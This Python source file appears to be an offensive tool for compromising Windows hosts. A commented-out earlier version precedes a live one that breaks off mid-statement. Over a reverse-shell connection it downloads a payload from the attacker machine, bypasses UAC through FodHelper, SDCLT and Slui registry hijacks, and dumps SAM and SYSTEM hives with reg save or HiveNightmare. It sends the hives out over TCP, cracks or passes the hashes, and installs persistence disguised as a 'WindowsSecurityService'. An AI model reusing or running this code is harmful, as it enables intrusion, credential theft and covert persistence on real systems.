# import socket
# import time
# import subprocess
# import os
# from datetime import datetime

# def create_listener(port, host='0.0.0.0'):
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#     s.bind((host, port))
#     s.listen(5)
#     print(f"Listening on {host}:{port}")
#     return s

# def send_payload(conn, payload, verbose=True):
#     conn.send(f"{payload}\n".encode())
#     time.sleep(1)
#     data = conn.recv(2048)
#     if verbose:
#         print(f"Received: {data.decode()}")
#         print("-" * 50)
#     return data.decode()

# def get_curr_dir(conn):
#     return send_payload(conn, payload="Get-Location | Select-Object -ExpandProperty Path", verbose=False).split()[0]

# def socket_write_file(conn, port, filename, payload):
#     # First create the listener
#     s = create_listener(port=port)
#     # Then send the payload to trigger the connection
#     print(f"Sending command to initiate file transfer...")
#     send_payload(conn, payload)
#     # Now wait for the connection
#     print(f"Waiting for file connection on port {port}...")
#     file_conn, file_addr = s.accept()
#     print(f"File transfer connection from {file_addr}")
#     # Receive data and save to file
#     with open(filename, 'wb') as f:
#         while True:
#             data = file_conn.recv(4096)
#             if not data:
#                 break
#             print(f"Received {len(data)} bytes")
#             f.write(data)
#     print(f"Data received and saved to {filename}")
#     file_conn.close()
#     s.close()

# def run_impacket_secretsdump(sam_file, system_file, output_file=None):
#     """
#     Run Impacket's secretsdump.py against the obtained SAM and SYSTEM hives
#     """
#     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
#     if output_file is None:
#         output_file = f"extracted_hashes_{timestamp}.txt"
    
#     print(f"\n[+] Extracting password hashes with Impacket's secretsdump")
#     print(f"[+] SAM file: {sam_file}")
#     print(f"[+] SYSTEM file: {system_file}")
#     print(f"[+] Output file: {output_file}")
    
#     try:
#         # Run secretsdump.py with the SAM and SYSTEM files
#         cmd = ["secretsdump.py", "LOCAL", "-sam", sam_file, "-system", system_file]
        
#         # Run the command and capture output
#         process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
#         stdout, stderr = process.communicate()
        
#         # Check if there were any errors
#         if process.returncode != 0:
#             print(f"[!] Error running secretsdump.py: {stderr}")
#             return False
            
#         # Save output to file
#         with open(output_file, 'w') as f:
#             f.write(stdout)
            
#         # Print hashes to console
#         print("\n[+] Extracted Hashes:")
#         print("-" * 50)
        
#         # Print only the user account lines (filter out the metadata)
#         for line in stdout.split('\n'):
#             if ':' in line and not line.startswith('['):
#                 print(line)
                
#         print("-" * 50)
#         print(f"[+] Full results saved to {output_file}")
#         return True
        
#     except Exception as e:
#         print(f"[!] Exception occurred: {str(e)}")
#         return False

# def pass_the_hash(target_ip, username, ntlm_hash, lm_hash="aad3b435b51404eeaad3b435b51404ee"):
#     """
#     Perform Pass-the-Hash attack against the target using extracted hashes
#     """
#     print(f"\n[+] Attempting Pass-the-Hash attack against {target_ip}")
#     print(f"[+] Username: {username}")
#     print(f"[+] NTLM Hash: {ntlm_hash}")
    
#     # Combine LM and NTLM hashes in the format required by Impacket
#     hash_combo = f"{lm_hash}:{ntlm_hash}"
    
#     # Try different authentication methods
#     methods = [
#         {
#             "name": "PsExec",
#             "cmd": ["psexec.py", f"{username}@{target_ip}", "-hashes", hash_combo]
#         },
#         {
#             "name": "WMI",
#             "cmd": ["wmiexec.py", f"{username}@{target_ip}", "-hashes", hash_combo]
#         },
#         {
#             "name": "SMBExec",
#             "cmd": ["smbexec.py", f"{username}@{target_ip}", "-hashes", hash_combo]
#         }
#     ]
    
#     # Try each method
#     for method in methods:
#         print(f"\n[+] Trying {method['name']} authentication...")
        
#         try:
#             # Start the process but don't wait for it to complete
#             # This will hand over control to the user for interactive shell access
#             print(f"[+] Running command: {' '.join(method['cmd'])}")
#             print(f"[+] If successful, you will get a shell. If not, try the next method.")
#             print(f"[+] To exit the shell, type 'exit' or use Ctrl+C")
            
#             # Execute the command
#             process = subprocess.Popen(method['cmd'])
#             process.wait()
            
#             # If the process returns with code 0, it was successful
#             if process.returncode == 0:
#                 print(f"[+] {method['name']} authentication successful!")
#                 return True
#             else:
#                 print(f"[!] {method['name']} authentication failed with return code {process.returncode}")
        
#         except Exception as e:
#             print(f"[!] Error trying {method['name']}: {str(e)}")
    
#     print("\n[!] All Pass-the-Hash methods failed")
#     return False

# def extract_hashes_from_dump(dump_output):
#     """
#     Parse the output from secretsdump.py to extract usernames and hashes
#     """
#     users = []
    
#     for line in dump_output.split('\n'):
#         if ':' in line and not line.startswith('['):
#             # Parse lines like: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#             parts = line.split(':')
#             if len(parts) >= 4:
#                 username = parts[0]
#                 rid = parts[1]
#                 lm_hash = parts[2]
#                 nt_hash = parts[3]
                
#                 users.append({
#                     "username": username,
#                     "rid": rid,
#                     "lm_hash": lm_hash,
#                     "nt_hash": nt_hash
#                 })
    
#     return users



# def main():
#     print("[+] Starting Windows privilege escalation and credential harvesting...")
    
#     local_ip = "192.168.120.132"  # Your attacker machine IP
#     # target_ip = input("[?] Enter target IP address: ")  # Add prompt for target IP
#     target_ip = "192.168.120.134"
#     executable_privilege_reverse = "rev.exe"  # Your reverse shell executable
#     download_file_name = "rev.exe"
    
#     # --- Stage 1: Establish normal privilege connection ---
#     print("\n[+] Stage 1: Waiting for initial connection...")
#     s_normal_priv = create_listener(port=4443)
#     conn_normal_priv, addr_normal_priv = s_normal_priv.accept()
#     print(f"[+] Connection received from {addr_normal_priv}")
    
#     # --- Stage 2: Set up UAC bypass ---
#     # --- Stage 2: Set up UAC bypass ---
#     print("\n[+] Stage 2: Setting up UAC bypass...")
#     curr_dir = get_curr_dir(conn_normal_priv)
#     print(f"[+] Target current directory: {curr_dir}")
    
#     # Download the reverse shell executable first
#     download_cmd = r'(New-Object System.Net.WebClient).DownloadFile("http://{}:{}/{}", "{}")'.format(
#         local_ip, 4445, download_file_name, download_file_name
#     )
#     send_payload(conn_normal_priv, download_cmd)
    
#     # Prompt for UAC bypass method
#     print("\n[+] Select UAC bypass method:")
#     print("  [1] FodHelper bypass (Windows 10)")
#     print("  [2] SDCLT bypass (Windows 10)")
#     print("  [3] Slui.exe bypass (Windows 10)")
    
#     bypass_choice = input("[?] Enter choice (1, 2, or 3): ")
    
#     if bypass_choice == "2":
#         # Set up the UAC bypass via SDCLT.exe
#         print("\n[+] Using SDCLT UAC bypass method...")
#         uac_bypass_payloads = [
#             r'New-Item "HKCU:\Software\Classes\exefile\shell\runas\command" -Force',
#             r'New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\runas\command" -Name "IsolatedCommand" -Value "{}\{}" -Force'.format(
#                 curr_dir, executable_privilege_reverse
#             ),
#         ]
        
#         # Trigger command for SDCLT
#         trigger_cmd = r'Start-Process "C:\Windows\System32\sdclt.exe" -ArgumentList "/kickoffelev" -WindowStyle Hidden'
#         cleanup_cmd = r'Remove-Item "HKCU:\Software\Classes\exefile" -Recurse -Force'
#     elif bypass_choice == "3":
#         # Set up the UAC bypass via Slui.exe
#         print("\n[+] Using Slui.exe UAC bypass method...")
#         uac_bypass_payloads = [
#             r'New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force',
#             r'Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value "{}\{}" -Force'.format(
#                 curr_dir, executable_privilege_reverse
#             ),
#         ]
        
#         # Trigger command for Slui.exe
#         trigger_cmd = r'Start-Process "C:\Windows\System32\slui.exe" -Verb runas'
#         cleanup_cmd = r'Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force'
#     else:
#         # Default to FodHelper bypass (option 1 or invalid input)
#         print("\n[+] Using FodHelper UAC bypass method...")
#         uac_bypass_payloads = [
#             r'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force',
#             r'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force',
#             r'Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{}\{}" -Force'.format(
#                 curr_dir, executable_privilege_reverse
#             ),
#         ]
        
#         # Trigger command for FodHelper
#         trigger_cmd = r'Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden'
#         cleanup_cmd = r'Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force'
    
#     # Apply the selected UAC bypass registry modifications
#     for payload in uac_bypass_payloads:
#         send_payload(conn_normal_priv, payload)
    
#     # --- Stage 3: Trigger UAC bypass and wait for elevated connection ---
#     print("\n[+] Stage 3: Triggering UAC bypass to get elevated privileges...")
#     s_high_priv = create_listener(port=4444)
    
#     # Trigger the UAC bypass and then clean up
#     trigger_payloads = [
#         trigger_cmd,
#         cleanup_cmd,
#     ]
    
#     for payload in trigger_payloads:
#         if payload:  # Only send non-empty payloads
#             send_payload(conn_normal_priv, payload)
    
#     print("[+] Waiting for elevated connection on port 4444...")
#     conn_high_priv, addr_high_priv = s_high_priv.accept()
#     print(f"[+] Elevated connection received from {addr_high_priv}")
    
#     # --- Stage 4: Choose registry hive extraction method ---
#     print("\n[+] Stage 4: Choose registry hive extraction method:")
#     print("  [1] Standard reg save command")
#     print("  [2] CVE-2021-36934 (HiveNightmare)")
    
#     extraction_choice = input("[?] Enter choice (1 or 2): ")
    
#     if extraction_choice == "2":
#         # --- Use HiveNightmare exploit with elevated privileges ---
#         print("\n[+] Using CVE-2021-36934 (HiveNightmare) to extract registry hives...")
        
#         # Get username for default path
#         username = send_payload(conn_high_priv, payload="echo $env:USERNAME", verbose=False).strip()
        
#         # Create PowerShell script for HiveNightmare
#         hivenightmare_script = '''
#         [CmdletBinding()]
#         param(
#             $path = "C:\\Users\\$env:USERNAME\\Desktop"
#         )
        
#         $outSam = "$path\\Sam.hive"
#         $outSoft = "$path\\Soft.hive"
#         $outSys = "$path\\Sys.hive"
        
#         if(-not(test-path $path)){
#             new-item $path -ItemType Directory | out-null
#         }
        
#         if(([environment]::OSVersion.Version).build -lt 17763){
#             Write-Host "[-] System not susceptible to CVE-2021-36934"
#             return $false
#         }
#         else{
#             Write-Host "[+] System is a vulnerable version of Windows"
#         }
        
#         $success = $false
        
#         for($i = 1; $i -le 9; $i++){
#             try{
#                 [System.IO.File]::Copy(("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + $i + "\\Windows\\System32\\config\\sam"), ($outSam + $i))
#                 Write-Host "[+] Dumping SAM$i hive..."
#                 $success = $true
#             } catch{}
            
#             try{
#                 [System.IO.File]::Copy(("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + $i + "\\Windows\\System32\\config\\software"), ($outSoft + $i))
#                 Write-Host "[+] Dumping SOFTWARE$i hive..."
#             } catch{}
            
#             try{
#                 [System.IO.File]::Copy(("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + $i + "\\Windows\\System32\\config\\system"), ($outSys + $i))
#                 Write-Host "[+] Dumping SYSTEM$i hive..."
#                 $success = $true
#             } catch{}
#         }
        
#         if(test-path $path\\s*.hive*){
#             Write-Host "[+] Hives are dumped to $path"
#             return $true
#         }
#         else{
#             Write-Host "[-] There are no Volume Shadow Copies on this system"
#             return $false
#         }
#         '''
        
#         # Save the script to a file on the target
#         script_path = f"C:\\Users\\{username}\\hivenightmare.ps1"
#         script_payload = f"$script = @'\n{hivenightmare_script}\n'@\nSet-Content -Path '{script_path}' -Value $script"
#         send_payload(conn_high_priv, script_payload, verbose=False)
        
#         # Execute the script
#         execute_payload = f"powershell -ExecutionPolicy Bypass -File {script_path}"
#         result = send_payload(conn_high_priv, execute_payload)
        
#         # Check if the exploit was successful
#         if "[+] Hives are dumped to" in result:
#             print("[+] HiveNightmare exploit successful!")
            
#             # Get path to the dumped files
#             desktop_path = f"C:\\Users\\{username}\\Desktop"
            
#             # Find SAM and SYSTEM files
#             sam_files = send_payload(conn_high_priv, f"Get-ChildItem {desktop_path} -Filter Sam.hive* | Select-Object -ExpandProperty FullName", verbose=False)
#             sys_files = send_payload(conn_high_priv, f"Get-ChildItem {desktop_path} -Filter Sys.hive* | Select-Object -ExpandProperty FullName", verbose=False)
            
#             sam_file_list = [f for f in sam_files.strip().split('\n') if f.strip()]
#             sys_file_list = [f for f in sys_files.strip().split('\n') if f.strip()]
            
#             if sam_file_list and sys_file_list:
#                 sam_file = sam_file_list[0]
#                 system_file = sys_file_list[0]
                
#                 print(f"[+] SAM hive found: {sam_file}")
#                 print(f"[+] SYSTEM hive found: {system_file}")
                
#                 # Prepare transfer commands for extracted hives
#                 elevated_dir = get_curr_dir(conn_high_priv)
#                 sam_transfer_cmd = f'''
#                 $filePath = "{sam_file}"
#                 $bytes = [System.IO.File]::ReadAllBytes($filePath)
#                 $tcpClient = New-Object System.Net.Sockets.TcpClient
#                 $tcpClient.Connect("{local_ip}", 8000)
#                 $stream = $tcpClient.GetStream()
#                 $stream.Write($bytes, 0, $bytes.Length)
#                 $stream.Close()
#                 $tcpClient.Close()
#                 '''
                
#                 sys_transfer_cmd = f'''
#                 $filePath = "{system_file}"
#                 $bytes = [System.IO.File]::ReadAllBytes($filePath)
#                 $tcpClient = New-Object System.Net.Sockets.TcpClient
#                 $tcpClient.Connect("{local_ip}", 8000)
#                 $stream = $tcpClient.GetStream()
#                 $stream.Write($bytes, 0, $bytes.Length)
#                 $stream.Close()
#                 $tcpClient.Close()
#                 '''
#             else:
#                 print("[!] HiveNightmare exploit failed to retrieve hives. Falling back to standard reg save.")
#                 extraction_choice = "1"  # Fall back to standard method
#         else:
#             print("[!] HiveNightmare exploit failed. Falling back to standard reg save.")
#             extraction_choice = "1"  # Fall back to standard method
    
#     if extraction_choice == "1":
#         # Standard registry extraction method
#         print("\n[+] Using standard reg save command to extract registry hives...")
#         dump_payloads = [
#             r'reg save HKLM\SAM sam.dump /y',
#             r'reg save HKLM\System sys.dump /y',
#         ]
        
#         for payload in dump_payloads:
#             send_payload(conn_high_priv, payload)
        
#         # Prepare transfer commands for standard reg save files
#         elevated_dir = get_curr_dir(conn_high_priv)
#         sam_transfer_cmd = r'$filePath = "{}\sam.dump";$bytes = [System.IO.File]::ReadAllBytes($filePath);$tcpClient = New-Object System.Net.Sockets.TcpClient;$tcpClient.Connect("{}", 8000);$stream = $tcpClient.GetStream();$stream.Write($bytes, 0, $bytes.Length);$stream.Close();$tcpClient.Close()'.format(
#             elevated_dir, local_ip
#         )
#         sys_transfer_cmd = r'$filePath = "{}\sys.dump";$bytes = [System.IO.File]::ReadAllBytes($filePath);$tcpClient = New-Object System.Net.Sockets.TcpClient;$tcpClient.Connect("{}", 8000);$stream = $tcpClient.GetStream();$stream.Write($bytes, 0, $bytes.Length);$stream.Close();$tcpClient.Close()'.format(
#             elevated_dir, local_ip
#         )
    
#     # Transfer files
#     print("[+] Transferring SAM hive...")
#     socket_write_file(conn=conn_high_priv, port=8000, filename="sam.dump", payload=sam_transfer_cmd)
    
#     print("[+] Transferring SYSTEM hive...")
#     socket_write_file(conn=conn_high_priv, port=8000, filename="sys.dump", payload=sys_transfer_cmd)
    
#     # --- Stage 6: Extract password hashes ---
#     print("\n[+] Stage 6: Extracting password hashes...")
#     process = subprocess.Popen(
#         ["secretsdump.py", "LOCAL", "-sam", "sam.dump", "-system", "sys.dump"], 
#         stdout=subprocess.PIPE, 
#         stderr=subprocess.PIPE, 
#         text=True
#     )
#     stdout, stderr = process.communicate()
    
#     # Save output to file
#     with open("windows_hashes.txt", 'w') as f:
#         f.write(stdout)
    
#     print(stdout)
    
#     # Extract user accounts and hashes from the output
#     users = extract_hashes_from_dump(stdout)
    
#     # --- Stage 7: Perform Pass-the-Hash attack ---
#     print("\n[+] Stage 7: Preparing for Pass-the-Hash attack")
    
#     if len(users) > 0:
#         print("\n[+] Available user accounts:")
#         for i, user in enumerate(users):
#             print(f"  [{i}] {user['username']} (RID: {user['rid']}) - Hash: {user['nt_hash']}")
        
#         try:
#             choice = int(input("\n[?] Select user to use for Pass-the-Hash attack (or -1 to skip): "))
#             if choice >= 0 and choice < len(users):
#                 selected_user = users[choice]
#                 pass_the_hash(
#                     target_ip, 
#                     selected_user['username'], 
#                     selected_user['nt_hash']
#                 )
#             else:
#                 print("[!] Pass-the-Hash attack skipped.")
#         except ValueError:
#             print("[!] Invalid selection, Pass-the-Hash attack skipped.")
#     else:
#         print("[!] No user accounts found in the hash dump.")
    
#     # --- Stage 8: Clean up ---
#     print("\n[+] Stage 8: Cleaning up...")
#     conn_normal_priv.close()
#     s_normal_priv.close()
    
#     # Close high_priv connections
#     conn_high_priv.close()
#     s_high_priv.close()
    
#     print("\n[+] Operation completed successfully!")
#     print("[+] Password hashes have been extracted to windows_hashes.txt")

# if __name__ == "__main__":
#     main()

import socket
import time
import subprocess
import os
from datetime import datetime

def create_listener(port, host='0.0.0.0'):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(5)
    print(f"Listening on {host}:{port}")
    return s

def send_payload(conn, payload, verbose=True):
    conn.send(f"{payload}\n".encode())
    time.sleep(1)
    data = conn.recv(2048)
    if verbose:
        print(f"Received: {data.decode()}")
        print("-" * 50)
    return data.decode()

def get_curr_dir(conn):
    return send_payload(conn, payload="Get-Location | Select-Object -ExpandProperty Path", verbose=False).split()[0]

def socket_write_file(conn, port, filename, payload):
    # First create the listener
    s = create_listener(port=port)
    # Then send the payload to trigger the connection
    print(f"Sending command to initiate file transfer...")
    send_payload(conn, payload)
    # Now wait for the connection
    print(f"Waiting for file connection on port {port}...")
    file_conn, file_addr = s.accept()
    print(f"File transfer connection from {file_addr}")
    # Receive data and save to file
    with open(filename, 'wb') as f:
        while True:
            data = file_conn.recv(4096)
            if not data:
                break
            print(f"Received {len(data)} bytes")
            f.write(data)
    print(f"Data received and saved to {filename}")
    file_conn.close()
    s.close()

def run_impacket_secretsdump(sam_file, system_file, output_file=None):
    """
    Run Impacket's secretsdump.py against the obtained SAM and SYSTEM hives
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    if output_file is None:
        output_file = f"extracted_hashes_{timestamp}.txt"
    
    print(f"\n[+] Extracting password hashes with Impacket's secretsdump")
    print(f"[+] SAM file: {sam_file}")
    print(f"[+] SYSTEM file: {system_file}")
    print(f"[+] Output file: {output_file}")
    
    try:
        # Run secretsdump.py with the SAM and SYSTEM files
        cmd = ["secretsdump.py", "LOCAL", "-sam", sam_file, "-system", system_file]
        
        # Run the command and capture output
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        
        # Check if there were any errors
        if process.returncode != 0:
            print(f"[!] Error running secretsdump.py: {stderr}")
            return False
            
        # Save output to file
        with open(output_file, 'w') as f:
            f.write(stdout)
            
        # Print hashes to console
        print("\n[+] Extracted Hashes:")
        print("-" * 50)
        
        # Print only the user account lines (filter out the metadata)
        for line in stdout.split('\n'):
            if ':' in line and not line.startswith('['):
                print(line)
                
        print("-" * 50)
        print(f"[+] Full results saved to {output_file}")
        return True
        
    except Exception as e:
        print(f"[!] Exception occurred: {str(e)}")
        return False

def extract_hashes_from_dump(dump_output):
    """
    Parse the output from secretsdump.py to extract usernames and hashes
    """
    users = []
    
    for line in dump_output.split('\n'):
        if ':' in line and not line.startswith('['):
            # Parse lines like: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            parts = line.split(':')
            if len(parts) >= 4:
                username = parts[0]
                rid = parts[1]
                lm_hash = parts[2]
                nt_hash = parts[3]
                
                users.append({
                    "username": username,
                    "rid": rid,
                    "lm_hash": lm_hash,
                    "nt_hash": nt_hash
                })
    
    return users

def prepare_hashcat_file(users, output_file="hashcat_input.txt"):
    """
    Prepare a file with NTLM hashes in a format suitable for hashcat
    """
    print(f"\n[+] Preparing hashes for hashcat in {output_file}")
    
    with open(output_file, 'w') as f:
        for user in users:
            # Format for hashcat mode 1000 (NTLM)
            f.write(f"{user['username']}:{user['rid']}:{user['lm_hash']}:{user['nt_hash']}:::\n")
    
    print(f"[+] Created hashcat input file with {len(users)} user hashes")
    return output_file

def run_hashcat_attack(hash_file, wordlist=None, rule=None, attack_mode=0):
    """
    Run hashcat to crack the NTLM hashes
    
    Parameters:
    - hash_file: File containing the hashes
    - wordlist: Path to wordlist file (default: rockyou.txt)
    - rule: Hashcat rule to apply (default: None)
    - attack_mode: Hashcat attack mode (default: 0 = dictionary attack)
    """
    print("\n[+] Starting hashcat password cracking...")
    
    # Default wordlist if none specified
    if wordlist is None:
        wordlist = "/usr/share/wordlists/rockyou.txt"
        print(f"[+] Using default wordlist: {wordlist}")
    
    # Base command
    cmd = ["hashcat", "-m", "1000", "-a", str(attack_mode), hash_file]
    
    # Add wordlist for dictionary attacks
    if attack_mode == 0:
        cmd.append(wordlist)
    
    # Add rule if specified
    if rule:
        cmd.extend(["-r", rule])
    
    # Add output options
    cmd.extend(["--outfile=cracked_passwords.txt", "--outfile-format=2", "--show"])
    
    print(f"[+] Running command: {' '.join(cmd)}")
    
    try:
        # First run hashcat to crack passwords
        crack_cmd = cmd.copy()
        if "--show" in crack_cmd:
            crack_cmd.remove("--show")
        
        print("[+] Running hashcat, this may take some time...")
        process = subprocess.Popen(crack_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        
        # Then show the results
        show_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        show_stdout, show_stderr = show_process.communicate()
        
        # Display cracked passwords
        print("\n[+] Cracked credentials:")
        print("-" * 50)
        
        cracked_count = 0
        for line in show_stdout.split('\n'):
            if ':' in line:
                print(line)
                cracked_count += 1
        
        print("-" * 50)
        print(f"[+] Cracked {cracked_count} out of {len(open(hash_file).readlines())} passwords")
        print(f"[+] Cracked passwords saved to cracked_passwords.txt")
        
        return True
    
    except Exception as e:
        print(f"[!] Error running hashcat: {str(e)}")
        return False
    
def add_persistence(conn_high_priv, payload_path, persistence_type="registry"):
    """
    Add persistence to make the reverse shell run on startup
    
    Parameters:
    - conn_high_priv: The high privilege connection
    - payload_path: Path to the reverse shell executable
    - persistence_type: Type of persistence method to use
    """
    print("\n[+] Stage 9: Adding persistence...")
    
    # Get the username for personalized paths
    username = send_payload(conn_high_priv, payload="echo $env:USERNAME", verbose=False).strip()
    
    if persistence_type == "registry":
        # Method 1: Registry Run key persistence
        print("[+] Adding registry Run key persistence...")
        
        reg_command = f'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityService /t REG_SZ /d "{payload_path}" /f'
        result = send_payload(conn_high_priv, reg_command)
        
        if "success" in result.lower():
            print("[+] Registry persistence added successfully")
        else:
            print("[!] Failed to add registry persistence")
            
    elif persistence_type == "scheduled_task":
        # Method 2: Scheduled Task persistence
        print("[+] Adding scheduled task persistence...")
        
        # Create a scheduled task that runs at logon
        task_command = f'schtasks /create /tn "Windows Security Service" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f'
        result = send_payload(conn_high_priv, task_command)
        
        if "success" in result.lower():
            print("[+] Scheduled task persistence added successfully")
        else:
            print("[!] Failed to add scheduled task persistence")
            
    elif persistence_type == "service":
        # Method 3: Create a Windows service
        print("[+] Adding service persistence...")
        
        # Create a new service
        service_command = f'sc create WindowsSecurityService binPath= "{payload_path}" start= auto'
        result = send_payload(conn_high_priv, service_command)
        
        if "success" in result.lower():
            # Start the service
            send_payload(conn_high_priv, 'sc start WindowsSecurityService')
            print("[+] Service persistence added successfully")
        else:
            print("[!] Failed to add service persistence")
            
    elif persistence_type == "wmi":
        pass
        # # Method 4: WMI persistence
        # print("[+] Adding WMI persistence...")
        
        # # PowerShell command to create a WMI event subscription
        # ps_command = f'''
        # $FilterArgs = @{{name='WindowsSecurityFilter';
        #                  EventNameSpace='root\\CimV2';
        #                  QueryLanguage="WQL";
        #                  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        # $Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs;

        # $ConsumerArgs = @{{name='WindowsSecurityConsumer';
        #                   CommandLineTemplate='{payload_path}'};
        # $Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs;

        # $BindingArgs = @{{Filter = [Ref]$Filter;
        #                   Consumer = [Ref]$Consumer};
        # $Binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs;
        
        # Write-Output "WMI persistence installed successfully"
        # '''
        
        # # Save the PowerShell script to a file
        # script_path = f"C:\\Users\\{username}\\wmi_persistence.ps1"
        # script_payload = f'$script = @"\n{ps_command}\n"@\nSet-Content -Path "{script_path}" -Value $script'
        # send_payload(conn_high_priv, script_payload, verbose=False)
        
        # # Execute the script with PowerShell
        # execute_payload = f'powershell -ExecutionPolicy Bypass -File "{script_path}"'
        # result = send_payload(conn_high_priv, execute_payload)
        
        # if "installed successfully" in result:
        #     print("[+] WMI persistence added successfully")
        # else:
        #     print("[!] Failed to add WMI persistence")
            
    elif persistence_type == "startup_folder":
        # Method 5: Startup folder persistence
        print("[+] Adding startup folder persistence...")
        
        # Copy the payload to the All Users startup folder
        startup_command = f'copy "{payload_path}" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\WindowsSecurityService.exe" /Y'
        result = send_payload(conn_high_priv, startup_command)
        
        if "1 file(s) copied" in result:
            print("[+] Startup folder persistence added successfully")
        else:
            print("[!] Failed to add startup folder persistence")
            
    print("[*] Persistence mechanism added. The payload will run on system startup.")
    return True

# To use this function in the main script, add the following code at the end of the main() function, 
# just before closing connections:

"""
# --- Stage 9: Add persistence ---
print("\n[+] Stage 9: Adding persistence for the reverse shell...")
print("  [1] Registry Run key (common, easy to detect)")
print("  [2] Scheduled Task (moderate stealth)")
print("  [3] Windows Service (requires high privileges)")
print("  [4] WMI Event Subscription (stealthy, complex)")
print("  [5] Startup Folder (common, easy to detect)")

persistence_choice = input("[?] Select persistence method (1-5): ")

# Get path to the reverse shell
rev_exe_path = f"{get_curr_dir(conn_high_priv)}\\{executable_privilege_reverse}"

if persistence_choice == "2":
    add_persistence(conn_high_priv, rev_exe_path, "scheduled_task")
elif persistence_choice == "3":
    add_persistence(conn_high_priv, rev_exe_path, "service")
elif persistence_choice == "4":
    add_persistence(conn_high_priv, rev_exe_path, "wmi")
elif persistence_choice == "5":
    add_persistence(conn_high_priv, rev_exe_path, "startup_folder")
else:
    # Default to registry method
    add_persistence(conn_high_priv, rev_exe_path, "registry")
"""

def main():
    print("[+] Starting Windows privilege escalation and credential harvesting...")
    
    local_ip = "192.168.120.132"  # Your attacker machine IP
    # target_ip = input("[?] Enter target IP address: ")  # Add prompt for target IP
    target_ip = "192.168.120.134"
    executable_privilege_reverse = "rev.exe"  # Your reverse shell executable
    download_file_name = "rev.exe"
    
    # --- Stage 1: Establish normal privilege connection ---
    print("\n[+] Stage 1: Waiting for initial connection...")
    s_normal_priv = create_listener(port=4443)
    conn_normal_priv, addr_normal_priv = s_normal_priv.accept()
    print(f"[+] Connection received from {addr_normal_priv}")
    
    # --- Stage 2: Set up UAC bypass ---
    print("\n[+] Stage 2: Setting up UAC bypass...")
    curr_dir = get_curr_dir(conn_normal_priv)
    print(f"[+] Target current directory: {curr_dir}")
    
    # Download the reverse shell executable first
    download_cmd = r'(New-Object System.Net.WebClient).DownloadFile("http://{}:{}/{}", "{}")'.format(
        local_ip, 4445, download_file_name, download_file_name
    )
    send_payload(conn_normal_priv, download_cmd)
    
    # Prompt for UAC bypass method
    print("\n[+] Select UAC bypass method:")
    print("  [1] FodHelper bypass (Windows 10)")
    print("  [2] SDCLT bypass (Windows 10)")
    print("  [3] Slui.exe bypass (Windows 10)")
    
    bypass_choice = input("[?] Enter choice (1, 2, or 3): ")
    
    if bypass_choice == "2":
        # Set up the UAC bypass via SDCLT.exe
        print("\n[+] Using SDCLT UAC bypass method...")
        uac_bypass_payloads = [
            r'New-Item "HKCU:\Software\Classes\exefile\shell\runas\command" -Force',
            r'New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\runas\command" -Name "IsolatedCommand" -Value "{}\{}" -Force'.format(
                curr_dir, executable_privilege_reverse
            ),
        ]
        
        # Trigger command for SDCLT
        trigger_cmd = r'Start-Process "C:\Windows\System32\sdclt.exe" -ArgumentList "/kickoffelev" -WindowStyle Hidden'
        cleanup_cmd = r'Remove-Item "HKCU:\Software\Classes\exefile" -Recurse -Force'
    elif bypass_choice == "3":
        # Set up the UAC bypass via Slui.exe
        print("\n[+] Using Slui.exe UAC bypass method...")
        uac_bypass_payloads = [
            r'New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force',
            r'Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value "{}\{}" -Force'.format(
                curr_dir, executable_privilege_reverse
            ),
        ]
        
        # Trigger command for Slui.exe
        trigger_cmd = r'Start-Process "C:\Windows\System32\slui.exe" -Verb runas'
        cleanup_cmd = r'Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force'
    else:
        # Default to FodHelper bypass (option 1 or invalid input)
        print("\n[+] Using FodHelper UAC bypass method...")
        uac_bypass_payloads = [
            r'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force',
